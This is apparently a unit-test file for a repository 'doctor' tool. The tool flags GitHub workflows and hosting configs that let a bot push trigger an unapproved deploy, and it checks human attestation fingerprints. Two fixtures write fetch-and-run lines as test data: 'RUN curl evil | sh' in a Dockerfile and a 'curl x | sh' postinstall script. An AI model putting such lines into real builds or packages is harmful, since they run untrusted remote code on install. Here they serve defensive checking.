"""B5: the deployment surface (RC-1, DEC-38). A push the bot may make must not be a deploy nobody approved."""
from __future__ import annotations

import json
import unittest

from doctorlib import deploy, levelcalc

from .helpers import BoundaryCase

DEPLOY_ON_PUSH = """name: deploy
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npx cdk deploy --all --require-approval never
"""

DEPLOY_ANY_BRANCH = """name: deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: terraform apply -auto-approve
"""

GATED = """name: deploy
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: sst deploy --stage prod
"""


class SurfaceCase(BoundaryCase):
    GROUPS = {"deploy-surface"}

    def repo_with(self, files, config=None):
        return self.kit_repo(config=config, files=files)

    def triggers(self, repo, config_override=None):
        ctx = self.ctx(repo)
        surface = ctx.fact("deploy_surface")
        return ctx, surface, deploy.evaluate(ctx, surface)["triggers"]

    def attest(self, repo, **extra):
        """Write an attestation that matches the repo's current surface (what a human would do)."""
        ctx = self.ctx(repo)
        fp = ctx.fact("deploy_surface")["fingerprint"]
        cfg = {"deploy_surface": {"attested_at": "2026-10-26", "fingerprint": fp}}
        cfg.update(extra)
        return cfg


class WorkflowDetection(SurfaceCase):
    def test_push_main_deploy_is_ungated_main(self):
        repo = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ON_PUSH})
        res = self.results(self.ctx(repo))
        hit = self.assertFails(res, "deploy.main-workflow")
        self.assertIn("cdk deploy", hit[0].message)
        self.assertIn("push:main", hit[0].message)
        self.assertEqual(hit[0].severity, "warn")

    def test_push_any_branch_deploy_is_a_bot_pushable_error(self):
        repo = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ANY_BRANCH})
        hit = self.assertFails(self.results(self.ctx(repo)), "deploy.push-workflow")
        self.assertEqual(hit[0].severity, "error")
        self.assertIn("terraform apply", hit[0].message)

    def test_boundary_fixture_deploy_by_side_effect_caps_at_l1(self):
        """Report §15 item 9: a repo with an on: push deploy workflow; an L2 bot push is refused."""
        repo = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ANY_BRANCH})
        ctx = self.ctx(repo)
        res = self.results(ctx)
        cap = levelcalc.cap_b5(ctx, levelcalc.R(res))
        self.assertEqual(cap.level, 1)
        self.assertIn("deploy.yml", cap.reason)

    def test_gated_by_environment_attested_and_job_names_one(self):
        repo = self.repo_with({".github/workflows/deploy.yml": GATED})
        cfg = self.attest(repo, deploy_triggers=[{"workflow": ".github/workflows/deploy.yml", "fires_on": "push:main", "gate": "gated-by-environment"}])
        repo2 = self.repo_with({".github/workflows/deploy.yml": GATED}, cfg)
        ctx = self.ctx(repo2)
        res = self.results(ctx)
        self.assertEqual(self.by_id(res, "deploy.workflow.deploy.yml")[0].status, "pass")
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(res)).level, 5)

    def test_attestation_claims_environment_but_job_has_none(self):
        repo0 = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ON_PUSH})
        cfg = self.attest(repo0, deploy_triggers=[{"workflow": ".github/workflows/deploy.yml", "fires_on": "push:main", "gate": "gated-by-environment"}])
        repo = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ON_PUSH}, cfg)
        ctx, surface, trig = self.triggers(repo)
        self.assertEqual(trig[0]["gate"], "none")
        self.assertIn("no environment", " ".join(trig[0]["problems"]))
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(self.results(ctx))).level, 4)

    def test_attestation_that_does_not_cover_the_events_the_workflow_fires_on(self):
        text = DEPLOY_ON_PUSH.replace("branches: [main]", "branches: [main, 'release/**']")
        repo0 = self.repo_with({".github/workflows/deploy.yml": text})
        cfg = self.attest(repo0, deploy_triggers=[{"workflow": ".github/workflows/deploy.yml", "fires_on": "push:main", "gate": "none"}])
        repo = self.repo_with({".github/workflows/deploy.yml": text}, cfg)
        ctx, surface, trig = self.triggers(repo)
        self.assertTrue(trig[0]["ungated_bot_pushable"])
        self.assertIn("push:branches", " ".join(trig[0]["problems"]))

    def test_environment_without_required_reviewers_in_recorded_github_data(self):
        repo0 = self.repo_with({".github/workflows/deploy.yml": GATED})
        cfg = self.attest(repo0, deploy_triggers=[{"workflow": ".github/workflows/deploy.yml", "fires_on": "push:main", "gate": "gated-by-environment"}])
        repo = self.repo_with({".github/workflows/deploy.yml": GATED}, cfg)
        from doctorlib import github
        fx = {"repos/acme/widgets": {"default_branch": "main"}, "repos/acme/widgets/environments": {"environments": [{"name": "production", "protection_rules": []}]}}
        ctx = self.ctx(repo, ghapi=github.fixture_ghapi(fx))
        trig = deploy.evaluate(ctx, ctx.fact("deploy_surface"))["triggers"]
        self.assertEqual(trig[0]["gate"], "none")
        self.assertIn("no required reviewers", " ".join(trig[0]["problems"]))

    def test_a_manual_gate_cannot_hold_for_a_workflow_an_event_starts(self):
        repo0 = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ON_PUSH})
        cfg = self.attest(repo0, deploy_triggers=[{"workflow": ".github/workflows/deploy.yml", "fires_on": "push:main", "gate": "manual"}])
        repo = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ON_PUSH}, cfg)
        ctx, surface, trig = self.triggers(repo)
        self.assertEqual(trig[0]["gate"], "none")
        self.assertIn("cannot hold", " ".join(trig[0]["problems"]))

    def test_declared_not_deploying_is_accepted(self):
        repo0 = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ANY_BRANCH})
        cfg = self.attest(repo0, deploy_triggers=[{"workflow": ".github/workflows/deploy.yml", "fires_on": "none", "gate": "manual"}])
        repo = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ANY_BRANCH}, cfg)
        ctx = self.ctx(repo)
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(self.results(ctx))).level, 5)

    def test_non_push_triggers_the_bot_can_cause(self):
        base = "name: x\non:\n  %s\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - run: flyctl deploy\n"
        cases = {"repository_dispatch:\n    types: [deploy]": "repository_dispatch", "release:\n    types: [published]": "release",
                 "workflow_run:\n    workflows: [CI]\n    types: [completed]": "workflow_run", "issue_comment:\n    types: [created]": "issue_comment",
                 "pull_request:\n    branches: [main]": "pull_request", "push:\n    tags: ['v*']": "tag", "create": "create",
                 "schedule:\n    - cron: '0 3 * * *'": "schedule:main", "workflow_run:\n    workflows: [CI]\n    branches: [main]": "workflow_run:main"}
        repo = self.repo_with({})
        for trig, fire in cases.items():
            with self.subTest(trigger=fire):
                repo.write(".github/workflows/x.yml", base % trig)
                fires = self.ctx(repo).fact("deploy_surface")["workflows"][0]["fires_on"]
                self.assertIn(fire, fires)

    def test_workflow_dispatch_only_is_human_started(self):
        text = "name: x\non: workflow_dispatch\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - run: terraform apply\n"
        repo = self.repo_with({".github/workflows/x.yml": text})
        res = self.results(self.ctx(repo))
        self.assertEqual(self.by_id(res, "deploy.workflow.x.yml")[0].status, "pass")

    def test_indirect_and_publish_style_deploys_are_found(self):
        cmds = ["pnpm run deploy", "make deploy", "./scripts/deploy.sh", "docker push ghcr.io/acme/app:latest", "npm publish", "gh release create v1",
                "kubectl apply -f k8s/", "helm upgrade app ./chart", "aws s3 sync ./dist s3://bucket", "serverless deploy", "wrangler deploy", "vercel --prod",
                "pulumi up --yes", "aws ecs update-service --cluster c --service s", "gcloud run deploy x", "firebase deploy", "netlify deploy --prod",
                "amplify publish", "git push heroku main", "curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_x/hook", "cargo publish", "twine upload dist/*"]
        repo = self.repo_with({})
        for cmd in cmds:
            with self.subTest(cmd=cmd):
                repo.write(".github/workflows/x.yml", "name: x\non: push\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - run: %s\n" % json.dumps(cmd))
                self.assertTrue(self.ctx(repo).fact("deploy_surface")["workflows"][0]["deploys"], cmd)

    def test_deploy_actions_by_uses(self):
        repo = self.repo_with({})
        for uses in ("aws-actions/amazon-ecs-deploy-task-definition@v2", "azure/webapps-deploy@v3", "superfly/flyctl-actions@master",
                     "cloudflare/wrangler-action@v3", "googleapis/release-please-action@v4", "peaceiris/actions-gh-pages@v4", "changesets/action@v1"):
            with self.subTest(uses=uses):
                repo.write(".github/workflows/x.yml", "name: x\non: push\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: %s\n" % uses)
                self.assertTrue(self.ctx(repo).fact("deploy_surface")["workflows"][0]["deploys"], uses)

    def test_docker_build_push_action_only_with_push_true(self):
        for push, expected in (("true", True), ("false", False)):
            text = "name: x\non: push\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: docker/build-push-action@v6\n        with:\n          push: %s\n" % push
            repo = self.repo_with({".github/workflows/x.yml": text})
            self.assertEqual(self.ctx(repo).fact("deploy_surface")["workflows"][0]["deploys"], expected)

    def test_reusable_workflow_call_inherits_the_callee_deploys(self):
        caller = "name: c\non: push\njobs:\n  go:\n    uses: ./.github/workflows/callee.yml\n"
        callee = "name: callee\non:\n  workflow_call:\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cdk deploy\n"
        repo = self.repo_with({".github/workflows/caller.yml": caller, ".github/workflows/callee.yml": callee})
        wfs = {w["file"]: w for w in self.ctx(repo).fact("deploy_surface")["workflows"]}
        self.assertTrue(wfs[".github/workflows/caller.yml"]["deploys"])
        self.assertEqual(wfs[".github/workflows/callee.yml"]["fires_on"], [])

    def test_unparsed_workflow_with_deploy_text_is_treated_as_deploying_on_push(self):
        text = 'name: x\non: push\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "note: deploying" && cdk deploy\n'
        repo = self.repo_with({".github/workflows/x.yml": text})
        wf = self.ctx(repo).fact("deploy_surface")["workflows"][0]
        self.assertFalse(wf["parsed"])
        self.assertTrue(wf["deploys"])
        self.assertEqual(wf["fires_on"], ["push:branches"])
        self.assertFails(self.results(self.ctx(repo)), "deploy.push-workflow")

    def test_unparsed_workflow_without_deploy_text_is_unknown_never_a_pass(self):
        text = 'name: x\non: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "a: b"\n'
        repo = self.repo_with({".github/workflows/x.yml": text})
        r = self.by_id(self.results(self.ctx(repo)), "deploy.unparsed")
        self.assertEqual([x.status for x in r], ["unknown"])

    def test_release_automation_is_reported_as_h5(self):
        text = "name: release\non:\n  push:\n    branches: [main]\njobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: googleapis/release-please-action@v4\n"
        repo = self.repo_with({".github/workflows/release.yml": text})
        res = self.results(self.ctx(repo))
        self.assertIn("H5", self.by_id(res, "deploy.release-automation")[0].message)

    def test_a_workflow_with_no_deploy_is_not_listed(self):
        repo = self.repo_with({".github/workflows/ci.yml": "name: ci\non: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pytest\n"})
        res = self.results(self.ctx(repo))
        self.assertEqual([r for r in res if r.id.startswith("deploy.push") or r.id.startswith("deploy.main")], [])


class HostConfigs(SurfaceCase):
    HOSTS = {"vercel.json": "vercel", "netlify.toml": "netlify", "amplify.yml": "amplify", "fly.toml": "fly", "wrangler.toml": "cloudflare", "render.yaml": "render",
             "railway.json": "railway", "Procfile": "heroku", "app.yaml": "gcp-app-engine", "firebase.json": "firebase", ".gitlab-ci.yml": "gitlab-ci",
             "Jenkinsfile": "jenkins", ".circleci/config.yml": "circleci", "buildspec.yml": "aws-codebuild", "azure-pipelines.yml": "azure-pipelines",
             "bitbucket-pipelines.yml": "bitbucket-pipelines", "flux-system/gotk.yaml": "gitops", "argocd/app.yaml": "gitops"}

    def test_each_host_config_file_is_detected_and_unattested_is_an_error(self):
        for fname, host in self.HOSTS.items():
            with self.subTest(file=fname):
                repo = self.repo_with({fname: "x\n"})
                res = self.check_one(self.ctx(repo), "deploy.surface")
                hit = self.assertFails(res, "deploy.host.%s" % host)
                self.assertEqual(hit[0].severity, "error")
                self.assertIn("nobody attested", hit[0].message)

    def test_attested_host_with_branch_previews_and_no_gate_is_l1(self):
        repo0 = self.repo_with({"vercel.json": "{}"})
        cfg = self.attest(repo0, git_integrated_hosts=[{"host": "vercel", "previews_on": "all-branches", "production_on": "main", "gate": "none"}])
        repo = self.repo_with({"vercel.json": "{}"}, cfg)
        ctx = self.ctx(repo)
        res = self.results(ctx)
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(res)).level, 1)
        self.assertIn("bot-pushable", self.assertFails(res, "deploy.host.vercel")[0].message)

    def test_attested_host_production_on_main_only_caps_at_l4(self):
        repo0 = self.repo_with({"netlify.toml": ""})
        cfg = self.attest(repo0, git_integrated_hosts=[{"host": "netlify", "previews_on": "none", "production_on": "main", "gate": "none"}])
        repo = self.repo_with({"netlify.toml": ""}, cfg)
        ctx = self.ctx(repo)
        res = self.results(ctx)
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(res)).level, 4)

    def test_label_triggered_previews_and_a_manual_gate_are_acceptable(self):
        repo0 = self.repo_with({"render.yaml": "x"})
        cfg = self.attest(repo0, git_integrated_hosts=[{"host": "render", "previews_on": "label", "production_on": "main", "gate": "manual"}])
        repo = self.repo_with({"render.yaml": "x"}, cfg)
        ctx = self.ctx(repo)
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(self.results(ctx))).level, 5)

    def test_staging_branch_production_is_bot_pushable(self):
        repo0 = self.repo_with({"fly.toml": "x"})
        cfg = self.attest(repo0, git_integrated_hosts=[{"host": "fly", "previews_on": "none", "production_on": "staging", "gate": "none"}])
        repo = self.repo_with({"fly.toml": "x"}, cfg)
        ctx = self.ctx(repo)
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(self.results(ctx))).level, 1)

    def test_a_dashboard_only_host_can_be_declared_without_a_file(self):
        cfg = {"deploy_surface": {"attested_at": "2026-10-26", "fingerprint": "x"},
               "git_integrated_hosts": [{"host": "vercel", "previews_on": "all-branches", "production_on": "main", "gate": "none"}]}
        repo0 = self.repo_with({}, cfg)
        fp = self.ctx(repo0).fact("deploy_surface")["fingerprint"]
        cfg["deploy_surface"]["fingerprint"] = fp
        repo = self.repo_with({}, cfg)
        ctx = self.ctx(repo)
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(self.results(ctx))).level, 1)

    def test_bad_attestation_entries_are_reported(self):
        cfg = {"git_integrated_hosts": [{"host": "vercel", "gate": "sometimes"}], "deploy_triggers": [{"workflow": "x.yml"}]}
        repo = self.repo_with({}, cfg)
        msgs = [r.message for r in self.assertFails(self.results(self.ctx(repo)), "deploy.attestation-schema")]
        self.assertEqual(len(msgs), 3, msgs)


class AttestationAndFingerprint(SurfaceCase):
    def test_empty_surface_still_needs_a_human_attestation(self):
        repo = self.repo_with({})
        ctx = self.ctx(repo)
        res = self.results(ctx)
        self.assertEqual(self.by_id(res, "deploy.attestation")[0].status, "fail")
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(res)).level, 1)

    def test_current_attestation_passes(self):
        repo0 = self.repo_with({})
        cfg = self.attest(repo0)
        repo = self.repo_with({}, cfg)
        ctx = self.ctx(repo)
        res = self.results(ctx)
        self.assertEqual(self.by_id(res, "deploy.attestation")[0].status, "pass")
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(res)).level, 5)

    def test_changing_a_deploy_surface_file_voids_the_attestation(self):
        repo0 = self.repo_with({"Dockerfile": "FROM scratch\n"})
        cfg = self.attest(repo0)
        repo = self.repo_with({"Dockerfile": "FROM scratch\n"}, cfg)
        self.assertEqual(self.by_id(self.results(self.ctx(repo)), "deploy.attestation")[0].status, "pass")
        repo.write("Dockerfile", "FROM scratch\nRUN curl evil | sh\n")
        res = self.results(self.ctx(repo))
        r = self.by_id(res, "deploy.attestation")[0]
        self.assertEqual((r.status, r.severity), ("fail", "error"))
        self.assertIn("changed", r.message)

    def test_adding_a_new_workflow_voids_the_attestation(self):
        repo0 = self.repo_with({".github/workflows/ci.yml": "name: ci\non: push\njobs: {}\n"})
        cfg = self.attest(repo0)
        repo = self.repo_with({".github/workflows/ci.yml": "name: ci\non: push\njobs: {}\n"}, cfg)
        repo.write(".github/workflows/new.yml", "name: n\non: push\njobs:\n  d:\n    runs-on: x\n    steps:\n      - run: echo hi\n")
        self.assertEqual(self.by_id(self.results(self.ctx(repo)), "deploy.attestation")[0].status, "fail")

    def test_package_json_scripts_are_part_of_the_fingerprint(self):
        repo0 = self.repo_with({"package.json": json.dumps({"scripts": {"test": "jest"}})})
        cfg = self.attest(repo0)
        repo = self.repo_with({"package.json": json.dumps({"scripts": {"test": "jest"}})}, cfg)
        self.assertEqual(self.by_id(self.results(self.ctx(repo)), "deploy.attestation")[0].status, "pass")
        repo.write("package.json", json.dumps({"scripts": {"test": "jest", "postinstall": "curl x | sh"}}))
        self.assertEqual(self.by_id(self.results(self.ctx(repo)), "deploy.attestation")[0].status, "fail")

    def test_unrelated_files_do_not_change_the_fingerprint(self):
        repo = self.repo_with({"src/app.py": "print(1)\n"})
        a = self.ctx(repo).fact("deploy_surface")["fingerprint"]
        repo.write("src/app.py", "print(2)\n")
        b = self.ctx(repo).fact("deploy_surface")["fingerprint"]
        self.assertEqual(a, b)

    def test_floor_patterns_cover_the_h3_deploy_surface_list(self):
        names = ["serverless.yml", "sst.config.ts", "amplify/backend.ts", "amplify.yml", "cdk.json", "bin/app.ts", "packages/infra/x.ts", "Dockerfile", "Dockerfile.prod",
                 "docker-compose.yml", "fly.toml", "vercel.json", "netlify.toml", "wrangler.toml", "render.yaml", "railway.json", "Procfile", "k8s/deploy.yaml",
                 "helm/values.yaml", "kustomization.yaml", "Chart.yaml", ".github/workflows/x.yml"]
        got = set(deploy.surface_files(names))
        self.assertEqual(got, set(names))

    def test_monorepo_subdirectory_configs_count_but_root_only_names_do_not(self):
        names = ["apps/web/vercel.json", "services/api/fly.toml", "services/api/Dockerfile.prod", "deploy/k8s/app.yaml", "infra/serverless.yml", "apps/web/wrangler.toml"]
        got = set(deploy.surface_files(names + ["src/app.yaml", "docs/template.yaml", "apps/web/.github/workflows/x.yml", "src/CNAME"]))
        self.assertEqual(got, set(names))

    def test_a_nested_vercel_json_needs_an_attestation(self):
        repo = self.repo_with({"apps/web/vercel.json": "{}"})
        self.assertFails(self.check_one(self.ctx(repo), "deploy.surface"), "deploy.host.vercel")

    def test_infrastructure_as_code_is_detected(self):
        repo = self.repo_with({"infra/main.tf": "", "cdk.json": "{}", "Pulumi.yaml": "x"})
        iac = self.ctx(repo).fact("deploy_surface")["iac"]
        self.assertEqual(set(iac), {"terraform", "cdk", "pulumi"})

    def test_cli_deploy_surface_prints_the_fingerprint_and_exits_nonzero_on_error(self):
        from .helpers import run_doctor
        repo = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ANY_BRANCH})
        rc, out, err = run_doctor(["--deploy-surface", "--repo", repo.path, "--home", self.fake_home.path, "--claude-version", "2.1.305"], self.fake_home.env())
        self.assertEqual(rc, 1, out + err)
        self.assertIn("deploy.push-workflow", out)
        self.assertIn("fingerprint:", out)


if __name__ == "__main__":
    unittest.main()
